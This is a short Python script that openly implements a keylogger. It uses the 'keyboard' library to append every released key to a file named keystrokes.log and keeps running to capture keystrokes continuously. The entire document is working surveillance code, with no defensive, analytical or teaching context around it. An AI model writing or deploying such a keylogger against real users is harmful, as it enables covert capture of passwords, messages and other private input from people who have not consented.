import keyboard

# File to save the logged keystrokes
log_file = "keystrokes.log"

# Function to write keystrokes to the log file
def log_keystroke(event):
    key = event.name
    with open(log_file, "a") as f:
        f.write(key + "\n")

# Set up the keylogger
keyboard.on_release(log_keystroke)

# Keep the script running to capture keystrokes continuously
keyboard.wait()






